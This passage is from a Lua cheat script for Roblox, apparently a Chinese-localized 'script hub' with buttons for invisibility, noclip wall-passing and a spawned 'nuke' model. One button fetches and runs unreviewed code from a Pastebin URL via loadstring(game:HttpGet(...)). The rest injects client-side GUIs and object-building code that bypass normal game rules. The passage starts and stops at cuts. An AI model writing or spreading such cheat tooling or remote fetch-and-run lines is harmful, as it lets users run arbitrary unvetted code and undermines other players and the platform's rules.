Circle.Size = UDim2.new(0, 18, 0, 18)
Circle.Image = "rbxassetid://3570695787"
Circle.ScaleType = Enum.ScaleType.Slice
Circle.SliceCenter = Rect.new(100, 100, 100, 100)
Circle.SliceScale = 0.120

InvisText.Name = "InvisText"
InvisText.Parent = Main
InvisText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisText.BackgroundTransparency = 1.000
InvisText.BorderColor3 = Color3.fromRGB(27, 42, 53)
InvisText.BorderSizePixel = 0
InvisText.Position = UDim2.new(0.0967741907, 0, 0, 0)
InvisText.Size = UDim2.new(0, 200, 0, 50)
InvisText.Font = Enum.Font.SourceSans
InvisText.Text = "通用隐身(出体)"
InvisText.TextColor3 = Color3.fromRGB(255, 255, 255)
InvisText.TextScaled = true
InvisText.TextSize = 14.000
InvisText.TextTransparency = 0.140
InvisText.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.BorderColor3 = Color3.fromRGB(27, 42, 53)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0.0241935477, 0, 0.738317728, 0)
Credits.Size = UDim2.new(0, 94, 0, 18)
Credits.Font = Enum.Font.SourceSans
Credits.Text = "Bebo Mods汉化组"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextTransparency = 0.250
Credits.TextWrapped = true

-- Scripts:

local UserInputService = game:GetService("UserInputService")
local runService = (game:GetService("RunService"))

local gui = Main

local dragging
local dragInput
local dragStart
local startPos

function Lerp(a, b, m)
    return a + (b - a) * m
end

local lastMousePos
local lastGoalPos
local DRAG_SPEED = (8) -- // The speed of the UI darg.
function Update(dt)
    if not (startPos) then
        return
    end
    if not (dragging) and (lastGoalPos) then
        gui.Position =
            UDim2.new(
            startPos.X.Scale,
            Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED),
            startPos.Y.Scale,
            Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED)
        )
        return
    end

    local delta = (lastMousePos - UserInputService:GetMouseLocation())
    local xGoal = (startPos.X.Offset - delta.X)
    local yGoal = (startPos.Y.Offset - delta.Y)
    lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
    gui.Position =
        UDim2.new(
        startPos.X.Scale,
        Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED),
        startPos.Y.Scale,
        Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED)
    )
end

gui.InputBegan:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            lastMousePos = UserInputService:GetMouseLocation()

            input.Changed:Connect(
                function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end
            )
        end
    end
)

gui.InputChanged:Connect(
    function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end
)

runService.Heartbeat:Connect(Update)

  	end    

})

Tab:AddButton({

	Name = "碰撞体积",

	Callback = function()

     loadstring(game:HttpGet('https://pastebin.com/raw/JYFXjEVh'))()

  	end    

})

Tab:AddButton({

	Name = "人物穿墙",

	Callback = function()

     local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0

Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0

StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true

Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left

Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by KingLuna"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true

Toggle.MouseButton1Click:connect(function()
	if Status.Text == "off" then
		Clipon = true
		Status.Text = "on"
		Status.TextColor3 = Color3.new(0,185,0)
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if not Clipon == false then
				for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif Status.Text == "on" then
		Clipon = false
		Status.Text = "off"
		Status.TextColor3 = Color3.new(170,0,0)
	end
end)

  	end    

})

Tab:AddButton({

	Name = "发射核弹[安慰]",

	Callback = function()

     -- made by 1ndrew nuke script
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
Model0 = Instance.new("Model")
Model1 = Instance.new("Model")
Part2 = Instance.new("Part")
CylinderMesh3 = Instance.new("CylinderMesh")
ObjectValue4 = Instance.new("ObjectValue")
Part5 = Instance.new("Part")
BlockMesh6 = Instance.new("BlockMesh")
Part7 = Instance.new("Part")
CylinderMesh8 = Instance.new("CylinderMesh")
Part9 = Instance.new("Part")
CylinderMesh10 = Instance.new("CylinderMesh")
Weld11 = Instance.new("Weld")
Weld12 = Instance.new("Weld")
Part13 = Instance.new("Part")
Script14 = Instance.new("Script")
BlockMesh15 = Instance.new("BlockMesh")
Part16 = Instance.new("Part")
CylinderMesh17 = Instance.new("CylinderMesh")
Part18 = Instance.new("Part")
BlockMesh19 = Instance.new("BlockMesh")
Weld20 = Instance.new("Weld")
Weld21 = Instance.new("Weld")
Weld22 = Instance.new("Weld")
Part23 = Instance.new("Part")
BlockMesh24 = Instance.new("BlockMesh")
Part25 = Instance.new("Part")
BlockMesh26 = Instance.new("BlockMesh")
Part27 = Instance.new("Part")
CylinderMesh28 = Instance.new("CylinderMesh")
Part29 = Instance.new("Part")
BlockMesh30 = Instance.new("BlockMesh")
Part31 = Instance.new("Part")
BlockMesh32 = Instance.new("BlockMesh")
ObjectValue33 = Instance.new("ObjectValue")
VehicleSeat34 = Instance.new("VehicleSeat")
Sound35 = Instance.new("Sound")
Script36 = Instance.new("Script")
Script37 = Instance.new("Script")
BlockMesh38 = Instance.new("BlockMesh")
Script39 = Instance.new("Script")
ScreenGui40 = Instance.new("ScreenGui")
Frame41 = Instance.new("Frame")
TextButton42 = Instance.new("TextButton")
TextButton43 = Instance.new("TextButton")
TextButton44 = Instance.new("TextButton")
TextButton45 = Instance.new("TextButton")
Script46 = Instance.new("Script")
ObjectValue47 = Instance.new("ObjectValue")
Frame48 = Instance.new("Frame")
TextButton49 = Instance.new("TextButton")
Script50 = Instance.new("Script")
TextButton51 = Instance.new("TextButton")
Script52 = Instance.new("Script")
TextLabel53 = Instance.new("TextLabel")
TextButton54 = Instance.new("TextButton")
Script55 = Instance.new("Script")
TextButton56 = Instance.new("TextButton")
Script57 = Instance.new("Script")
TextLabel58 = Instance.new("TextLabel")
NumberValue59 = Instance.new("NumberValue")
NumberValue60 = Instance.new("NumberValue")
NumberValue61 = Instance.new("NumberValue")
Frame62 = Instance.new("Frame")
TextLabel63 = Instance.new("TextLabel")
TextLabel64 = Instance.new("TextLabel")
TextLabel65 = Instance.new("TextLabel")
TextLabel66 = Instance.new("TextLabel")
TextLabel67 = Instance.new("TextLabel")
TextLabel68 = Instance.new("TextLabel")
TextLabel69 = Instance.new("TextLabel")
TextLabel70 = Instance.new("TextLabel")
TextButton71 = Instance.new("TextButton")
Script72 = Instance.new("Script")
Script73 = Instance.new("Script")
NumberValue74 = Instance.new("NumberValue")
Part75 = Instance.new("Part")
BlockMesh76 = Instance.new("BlockMesh")
Part77 = Instance.new("Part")
CylinderMesh78 = Instance.new("CylinderMesh")
Part79 = Instance.new("Part")
CylinderMesh80 = Instance.new("CylinderMesh")
Script81 = Instance.new("Script")
Part82 = Instance.new("Part")
Fire83 = Instance.new("Fire")
Smoke84 = Instance.new("Smoke")
Smoke85 = Instance.new("Smoke")
Smoke86 = Instance.new("Smoke")
Smoke87 = Instance.new("Smoke")
Smoke88 = Instance.new("Smoke")
BillboardGui89 = Instance.new("BillboardGui")
ImageLabel90 = Instance.new("ImageLabel")
Script91 = Instance.new("Script")
SpecialMesh92 = Instance.new("SpecialMesh")
Script93 = Instance.new("Script")
Script94 = Instance.new("Script")
Sound95 = Instance.new("Sound")
Sky96 = Instance.new("Sky")
Part97 = Instance.new("Part")
Sound98 = Instance.new("Sound")
Sound99 = Instance.new("Sound")
SpecialMesh100 = Instance.new("SpecialMesh")
PointLight101 = Instance.new("PointLight")
Smoke102 = Instance.new("Smoke")
Sound103 = Instance.new("Sound")
Model104 = Instance.new("Model")
Part105 = Instance.new("Part")
SpecialMesh106 = Instance.new("SpecialMesh")
Part107 = Instance.new("Part")
SpecialMesh108 = Instance.new("SpecialMesh")
Smoke109 = Instance.new("Smoke")
BillboardGui110 = Instance.new("BillboardGui")
ImageLabel111 = Instance.new("ImageLabel")
Script112 = Instance.new("Script")
Smoke113 = Instance.new("Smoke")
Smoke114 = Instance.new("Smoke")
Smoke115 = Instance.new("Smoke")
StringValue116 = Instance.new("StringValue")
StringValue117 = Instance.new("StringValue")
StringValue118 = Instance.new("StringValue")
Script119 = Instance.new("Script")
Script120 = Instance.new("Script")
Sound121 = Instance.new("Sound")
Sky122 = Instance.new("Sky")
Part123 = Instance.new("Part")
BlockMesh124 = Instance.new("BlockMesh")
Part125 = Instance.new("Part")
BlockMesh126 = Instance.new("BlockMesh")
Part127 = Instance.new("Part")
BlockMesh128 = Instance.new("BlockMesh")
Part129 = Instance.new("Part")
BlockMesh130 = Instance.new("BlockMesh")
Part131 = Instance.new("Part")
BlockMesh132 = Instance.new("BlockMesh")
Part133 = Instance.new("Part")
BlockMesh134 = Instance.new("BlockMesh")
Part135 = Instance.new("Part")
BlockMesh136 = Instance.new("BlockMesh")
Part137 = Instance.new("Part")
BlockMesh138 = Instance.new("BlockMesh")
Part139 = Instance.new("Part")
BlockMesh140 = Instance.new("BlockMesh")
Part141 = Instance.new("Part")
BlockMesh142 = Instance.new("BlockMesh")
Part143 = Instance.new("Part")
BlockMesh144 = Instance.new("BlockMesh")
Part145 = Instance.new("Part")
BlockMesh146 = Instance.new("BlockMesh")
Part147 = Instance.new("Part")
BlockMesh148 = Instance.new("BlockMesh")
Part149 = Instance.new("Part")
BlockMesh150 = Instance.new("BlockMesh")
Part151 = Instance.new("Part")
BlockMesh152 = Instance.new("BlockMesh")
Part153 = Instance.new("Part")
BlockMesh154 = Instance.new("BlockMesh")
Part155 = Instance.new("Part")
BlockMesh156 = Instance.new("BlockMesh")
Part157 = Instance.new("Part")
BlockMesh158 = Instance.new("BlockMesh")
Part159 = Instance.new("Part")
CylinderMesh160 = Instance.new("CylinderMesh")
Part161 = Instance.new("Part")
BlockMesh162 = Instance.new("BlockMesh")
Part163 = Instance.new("Part")
BlockMesh164 = Instance.new("BlockMesh")
Part165 = Instance.new("Part")
BlockMesh166 = Instance.new("BlockMesh")
WedgePart167 = Instance.new("WedgePart")
SpecialMesh168 = Instance.new("SpecialMesh")
WedgePart169 = Instance.new("WedgePart")
SpecialMesh170 = Instance.new("SpecialMesh")
WedgePart171 = Instance.new("WedgePart")
SpecialMesh172 = Instance.new("SpecialMesh")
WedgePart173 = Instance.new("WedgePart")
SpecialMesh174 = Instance.new("SpecialMesh")
WedgePart175 = Instance.new("WedgePart")
SpecialMesh176 = Instance.new("SpecialMesh")
WedgePart177 = Instance.new("WedgePart")
SpecialMesh178 = Instance.new("SpecialMesh")
WedgePart179 = Instance.new("WedgePart")
SpecialMesh180 = Instance.new("SpecialMesh")
WedgePart181 = Instance.new("WedgePart")
SpecialMesh182 = Instance.new("SpecialMesh")
WedgePart183 = Instance.new("WedgePart")
SpecialMesh184 = Instance.new("SpecialMesh")
WedgePart185 = Instance.new("WedgePart")
SpecialMesh186 = Instance.new("SpecialMesh")
WedgePart187 = Instance.new("WedgePart")
SpecialMesh188 = Instance.new("SpecialMesh")
WedgePart189 = Instance.new("WedgePart")
SpecialMesh190 = Instance.new("SpecialMesh")
WedgePart191 = Instance.new("WedgePart")
SpecialMesh192 = Instance.new("SpecialMesh")
Model193 = Instance.new("Model")
Part194 = Instance.new("Part")
CylinderMesh195 = Instance.new("CylinderMesh")
Part196 = Instance.new("Part")
CylinderMesh197 = Instance.new("CylinderMesh")
Part198 = Instance.new("Part")
CylinderMesh199 = Instance.new("CylinderMesh")
Part200 = Instance.new("Part")
CylinderMesh201 = Instance.new("CylinderMesh")
Part202 = Instance.new("Part")
BlockMesh203 = Instance.new("BlockMesh")
Part204 = Instance.new("Part")
BlockMesh205 = Instance.new("BlockMesh")
Part206 = Instance.new("Part")
BlockMesh207 = Instance.new("BlockMesh")
Part208 = Instance.new("Part")
BlockMesh209 = Instance.new("BlockMesh")
Part210 = Instance.new("Part")
BlockMesh211 = Instance.new("BlockMesh")
Part212 = Instance.new("Part")
BlockMesh213 = Instance.new("BlockMesh")
Part214 = Instance.new("Part")
BlockMesh215 = Instance.new("BlockMesh")
Part216 = Instance.new("Part")
BlockMesh217 = Instance.new("BlockMesh")
Part218 = Instance.new("Part")
BlockMesh219 = Instance.new("BlockMesh")
Part220 = Instance.new("Part")
BlockMesh221 = Instance.new("BlockMesh")
Part222 = Instance.new("Part")
BlockMesh223 = Instance.new("BlockMesh")
Part224 = Instance.new("Part")
BlockMesh225 = Instance.new("BlockMesh")
Part226 = Instance.new("Part")
BlockMesh227 = Instance.new("BlockMesh")
Part228 = Instance.new("Part")
BlockMesh229 = Instance.new("BlockMesh")
Part230 = Instance.new("Part")
BlockMesh231 = Instance.new("BlockMesh")
Part232 = Instance.new("Part")
BlockMesh233 = Instance.new("BlockMesh")
Part234 = Instance.new("Part")
BlockMesh235 = Instance.new("BlockMesh")
Part236 = Instance.new("Part")
BlockMesh237 = Instance.new("BlockMesh")
Part238 = Instance.new("Part")
BlockMesh239 = Instance.new("BlockMesh")
Part240 = Instance.new("Part")
BlockMesh241 = Instance.new("BlockMesh")
Part242 = Instance.new("Part")
BlockMesh243 = Instance.new("BlockMesh")
Part244 = Instance.new("Part")
BlockMesh245 = Instance.new("BlockMesh")
Part246 = Instance.new("Part")
BlockMesh247 = Instance.new("BlockMesh")
Part248 = Instance.new("Part")
CylinderMesh249 = Instance.new("CylinderMesh")
Part250 = Instance.new("Part")
BlockMesh251 = Instance.new("BlockMesh")
Part252 = Instance.new("Part")
BlockMesh253 = Instance.new("BlockMesh")
Part254 = Instance.new("Part")
BlockMesh255 = Instance.new("BlockMesh")
Part256 = Instance.new("Part")
BlockMesh257 = Instance.new("BlockMesh")
Part258 = Instance.new("Part")
BlockMesh259 = Instance.new("BlockMesh")
Part260 = Instance.new("Part")
BlockMesh261 = Instance.new("BlockMesh")
Part262 = Instance.new("Part")
BlockMesh263 = Instance.new("BlockMesh")
Part264 = Instance.new("Part")
BlockMesh265 = Instance.new("BlockMesh")
Part266 = Instance.new("Part")
BlockMesh267 = Instance.new("BlockMesh")
Part268 = Instance.new("Part")
BlockMesh269 = Instance.new("BlockMesh")
Part270 = Instance.new("Part")
BlockMesh271 = Instance.new("BlockMesh")
Part272 = Instance.new("Part")
BlockMesh273 = Instance.new("BlockMesh")
Part274 = Instance.new("Part")
BlockMesh275 = Instance.new("BlockMesh")
Part276 = Instance.new("Part")
BlockMesh277 = Instance.new("BlockMesh")
Part278 = Instance.new("Part")
BlockMesh279 = Instance.new("BlockMesh")
Part280 = Instance.new("Part")
BlockMesh281 = Instance.new("BlockMesh")
Part282 = Instance.new("Part")
BlockMesh283 = Instance.new("BlockMesh")
Part284 = Instance.new("Part")
BlockMesh285 = Instance.new("BlockMesh")
Part286 = Instance.new("Part")
BlockMesh287 = Instance.new("BlockMesh")
Part288 = Instance.new("Part")
BlockMesh289 = Instance.new("BlockMesh")
Part290 = Instance.new("Part")
BlockMesh291 = Instance.new("BlockMesh")
Part292 = Instance.new("Part")
BlockMesh293 = Instance.new("BlockMesh")
WedgePart294 = Instance.new("WedgePart")
SpecialMesh295 = Instance.new("SpecialMesh")
WedgePart296 = Instance.new("WedgePart")
SpecialMesh297 = Instance.new("SpecialMesh")
WedgePart298 = Instance.new("WedgePart")
SpecialMesh299 = Instance.new("SpecialMesh")
WedgePart300 = Instance.new("WedgePart")
SpecialMesh301 = Instance.new("SpecialMesh")
VehicleSeat302 = Instance.new("VehicleSeat")
WedgePart303 = Instance.new("WedgePart")
SpecialMesh304 = Instance.new("SpecialMesh")
WedgePart305 = Instance.new("WedgePart")
SpecialMesh306 = Instance.new("SpecialMesh")
WedgePart307 = Instance.new("WedgePart")
SpecialMesh308 = Instance.new("SpecialMesh")
WedgePart309 = Instance.new("WedgePart")
SpecialMesh310 = Instance.new("SpecialMesh")
WedgePart311 = Instance.new("WedgePart")
SpecialMesh312 = Instance.new("SpecialMesh")
WedgePart313 = Instance.new("WedgePart")
SpecialMesh314 = Instance.new("SpecialMesh")
WedgePart315 = Instance.new("WedgePart")
SpecialMesh316 = Instance.new("SpecialMesh")
WedgePart317 = Instance.new("WedgePart")
SpecialMesh318 = Instance.new("SpecialMesh")
WedgePart319 = Instance.new("WedgePart")
SpecialMesh320 = Instance.new("SpecialMesh")
WedgePart321 = Instance.new("WedgePart")
SpecialMesh322 = Instance.new("SpecialMesh")
WedgePart323 = Instance.new("WedgePart")
SpecialMesh324 = Instance.new("SpecialMesh")
WedgePart325 = Instance.new("WedgePart")
SpecialMesh326 = Instance.new("SpecialMesh")
WedgePart327 = Instance.new("WedgePart")
SpecialMesh328 = Instance.new("SpecialMesh")
WedgePart329 = Instance.new("WedgePart")
SpecialMesh330 = Instance.new("SpecialMesh")
WedgePart331 = Instance.new("WedgePart")
SpecialMesh332 = Instance.new("SpecialMesh")
WedgePart333 = Instance.new("WedgePart")
SpecialMesh334 = Instance.new("SpecialMesh")
WedgePart335 = Instance.new("WedgePart")
SpecialMesh336 = Instance.new("SpecialMesh")
WedgePart337 = Instance.new("WedgePart")
SpecialMesh338 = Instance.new("SpecialMesh")
Part339 = Instance.new("Part")
BlockMesh340 = Instance.new("BlockMesh")
Part341 = Instance.new("Part")
BlockMesh342 = Instance.new("BlockMesh")
Part343 = Instance.new("Part")
BlockMesh344 = Instance.new("BlockMesh")
Part345 = Instance.new("Part")
BlockMesh346 = Instance.new("BlockMesh")
Part347 = Instance.new("Part")
BlockMesh348 = Instance.new("BlockMesh")
Part349 = Instance.new("Part")
BlockMesh350 = Instance.new("BlockMesh")
Part351 = Instance.new("Part")
BlockMesh352 = Instance.new("BlockMesh")
Part353 = Instance.new("Part")
BlockMesh354 = Instance.new("BlockMesh")
Part355 = Instance.new("Part")
BlockMesh356 = Instance.new("BlockMesh")
Part357 = Instance.new("Part")
BlockMesh358 = Instance.new("BlockMesh")
Part359 = Instance.new("Part")
BlockMesh360 = Instance.new("BlockMesh")
Part361 = Instance.new("Part")
BlockMesh362 = Instance.new("BlockMesh")
Part363 = Instance.new("Part")
BlockMesh364 = Instance.new("BlockMesh")
Part365 = Instance.new("Part")
BlockMesh366 = Instance.new("BlockMesh")
Part367 = Instance.new("Part")
BlockMesh368 = Instance.new("BlockMesh")
Part369 = Instance.new("Part")
BlockMesh370 = Instance.new("BlockMesh")
Part371 = Instance.new("Part")
CylinderMesh372 = Instance.new("CylinderMesh")
Part373 = Instance.new("Part")
BlockMesh374 = Instance.new("BlockMesh")
Part375 = Instance.new("Part")
BlockMesh376 = Instance.new("BlockMesh")
Part377 = Instance.new("Part")
BlockMesh378 = Instance.new("BlockMesh")
Part379 = Instance.new("Part")
BlockMesh380 = Instance.new("BlockMesh")
Part381 = Instance.new("Part")
CylinderMesh382 = Instance.new("CylinderMesh")
Part383 = Instance.new("Part")
CylinderMesh384 = Instance.new("CylinderMesh")
Part385 = Instance.new("Part")
CylinderMesh386 = Instance.new("CylinderMesh")
WedgePart387 = Instance.new("WedgePart")
SpecialMesh388 = Instance.new("SpecialMesh")
WedgePart389 = Instance.new("WedgePart")
SpecialMesh390 = Instance.new("SpecialMesh")
WedgePart391 = Instance.new("WedgePart")
SpecialMesh392 = Instance.new("SpecialMesh")
WedgePart393 = Instance.new("WedgePart")
SpecialMesh394 = Instance.new("SpecialMesh")
WedgePart395 = Instance.new("WedgePart")
SpecialMesh396 = Instance.new("SpecialMesh")
WedgePart397 = Instance.new("WedgePart")
SpecialMesh398 = Instance.new("SpecialMesh")
WedgePart399 = Instance.new("WedgePart")
SpecialMesh400 = Instance.new("SpecialMesh")
WedgePart401 = Instance.new("WedgePart")
SpecialMesh402 = Instance.new("SpecialMesh")
WedgePart403 = Instance.new("WedgePart")
SpecialMesh404 = Instance.new("SpecialMesh")
WedgePart405 = Instance.new("WedgePart")
SpecialMesh406 = Instance.new("SpecialMesh")
WedgePart407 = Instance.new("WedgePart")
SpecialMesh408 = Instance.new("SpecialMesh")
Part409 = Instance.new("Part")
BlockMesh410 = Instance.new("BlockMesh")
Part411 = Instance.new("Part")
BlockMesh412 = Instance.new("BlockMesh")
Part413 = Instance.new("Part")
BlockMesh414 = Instance.new("BlockMesh")
Part415 = Instance.new("Part")
BlockMesh416 = Instance.new("BlockMesh")
Part417 = Instance.new("Part")
CylinderMesh418 = Instance.new("CylinderMesh")
Part419 = Instance.new("Part")
CylinderMesh420 = Instance.new("CylinderMesh")
Part421 = Instance.new("Part")
CylinderMesh422 = Instance.new("CylinderMesh")
Part423 = Instance.new("Part")
CylinderMesh424 = Instance.new("CylinderMesh")
Part425 = Instance.new("Part")
CylinderMesh426 = Instance.new("CylinderMesh")
Part427 = Instance.new("Part")
BlockMesh428 = Instance.new("BlockMesh")
WedgePart429 = Instance.new("WedgePart")
SpecialMesh430 = Instance.new("SpecialMesh")
WedgePart431 = Instance.new("WedgePart")
SpecialMesh432 = Instance.new("SpecialMesh")
Part433 = Instance.new("Part")
CylinderMesh434 = Instance.new("CylinderMesh")
Part435 = Instance.new("Part")
CylinderMesh436 = Instance.new("CylinderMesh")
Part437 = Instance.new("Part")
CylinderMesh438 = Instance.new("CylinderMesh")
Part439 = Instance.new("Part")
CylinderMesh440 = Instance.new("CylinderMesh")
Part441 = Instance.new("Part")
CylinderMesh442 = Instance.new("CylinderMesh")
Part443 = Instance.new("Part")
CylinderMesh444 = Instance.new("CylinderMesh")
Part445 = Instance.new("Part")
CylinderMesh446 = Instance.new("CylinderMesh")
Part447 = Instance.new("Part")
CylinderMesh448 = Instance.new("CylinderMesh")
Part449 = Instance.new("Part")
CylinderMesh450 = Instance.new("CylinderMesh")
Part451 = Instance.new("Part")
CylinderMesh452 = Instance.new("CylinderMesh")
Model0.Name = "MAZ-450 Scud Nuclear"
Model0.Parent = mas
Model1.Name = "turret"
Model1.Parent = Model0
Part2.Parent = Model1
Part2.Material = Enum.Material.Metal
Part2.BrickColor = BrickColor.new("Grime")
Part2.Rotation = Vector3.new(0, 90, 0)
Part2.FormFactor = Enum.FormFactor.Plate
Part2.Size = Vector3.new(2, 0.400000006, 3)
Part2.CFrame = CFrame.new(12.8898954, 10.3001108, 38.9598312, 3.06876391e-05, 6.20403944e-06, 1, -3.31463598e-05, 1, -6.68033636e-06, -1, -2.63205093e-05, 2.09769823e-05)
Part2.BackSurface = Enum.SurfaceType.Weld
Part2.BottomSurface = Enum.SurfaceType.Smooth
Part2.FrontSurface = Enum.SurfaceType.Weld
Part2.LeftSurface = Enum.SurfaceType.Weld
Part2.RightSurface = Enum.SurfaceType.Weld
Part2.TopSurface = Enum.SurfaceType.Weld
Part2.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part2.Position = Vector3.new(12.8898954, 10.3001108, 38.9598312)
Part2.Orientation = Vector3.new(0, 90, 0)
Part2.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh3.Parent = Part2
CylinderMesh3.Scale = Vector3.new(1.79999995, 1, 2)
CylinderMesh3.Scale = Vector3.new(1.79999995, 1, 2)
ObjectValue4.Name = "WER"
ObjectValue4.Parent = Model1
ObjectValue4.Value = Weld12
Part5.Parent = Model1
Part5.Material = Enum.Material.Metal
Part5.BrickColor = BrickColor.new("Grime")
Part5.Rotation = Vector3.new(-90, 0, -180)
Part5.FormFactor = Enum.FormFactor.Custom
Part5.Size = Vector3.new(3, 0.400000006, 0.399999976)
Part5.CFrame = CFrame.new(12.8898659, 10.7001324, 40.1598129, -1, 5.64619597e-07, 6.20732499e-06, 6.68464554e-06, 1.11793124e-05, 1, 1.02754129e-05, 1, -4.35367065e-06)
Part5.BackSurface = Enum.SurfaceType.Weld
Part5.BottomSurface = Enum.SurfaceType.Smooth
Part5.FrontSurface = Enum.SurfaceType.Weld
Part5.LeftSurface = Enum.SurfaceType.Weld
Part5.RightSurface = Enum.SurfaceType.Weld
Part5.TopSurface = Enum.SurfaceType.Weld
Part5.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part5.Position = Vector3.new(12.8898659, 10.7001324, 40.1598129)
Part5.Orientation = Vector3.new(-90, -180, 0)
Part5.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh6.Parent = Part5
Part7.Parent = Model1
Part7.Material = Enum.Material.Metal
Part7.BrickColor = BrickColor.new("Grime")
Part7.Rotation = Vector3.new(90, 0, -90)
Part7.FormFactor = Enum.FormFactor.Symmetric
Part7.Size = Vector3.new(1, 1, 1)
Part7.CFrame = CFrame.new(13.8899441, 12.0000706, 38.9595375, 4.72349166e-05, 1, -3.85977728e-06, -4.47773564e-05, -4.33497553e-06, -1, -1, 3.75242453e-05, 3.79514786e-05)
Part7.BottomSurface = Enum.SurfaceType.Weld
Part7.TopSurface = Enum.SurfaceType.Weld
Part7.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part7.Position = Vector3.new(13.8899441, 12.0000706, 38.9595375)
Part7.Orientation = Vector3.new(90, 90, 0)
Part7.Color = Color3.new(0.498039, 0.556863, 0.392157)
CylinderMesh8.Parent = Part7
CylinderMesh8.Scale = Vector3.new(2, 1, 1.79999995)
CylinderMesh8.Scale = Vector3.new(2, 1, 1.79999995)
Part9.Name = "Connector"
Part9.Parent = Model1
Part9.Material = Enum.Material.Metal
Part9.BrickColor = BrickColor.new("Grime")
Part9.Rotation = Vector3.new(0, 90, 0)
